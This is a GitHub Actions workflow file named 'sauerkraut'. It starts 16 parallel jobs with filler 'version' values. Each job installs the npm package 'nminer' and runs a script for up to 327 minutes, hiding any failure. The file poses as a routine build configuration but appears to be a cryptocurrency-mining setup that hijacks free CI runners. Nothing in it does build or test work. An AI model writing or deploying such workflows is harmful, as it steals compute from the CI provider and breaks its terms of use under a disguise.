name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6771 }
          - { version: 4737 }
          - { version: 7186 }
          - { version: 6816 }
          - { version: 232 }
          - { version: 4077 }
          - { version: 7124 }
          - { version: 6306 }
          - { version: 5183 }
          - { version: 4443 }
          - { version: 183 }
          - { version: 2647 }
          - { version: 5395 }
          - { version: 3613 }
          - { version: 2913 }
          - { version: 4566 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 327m node sauerkraut.js || echo "sauerkraut executed"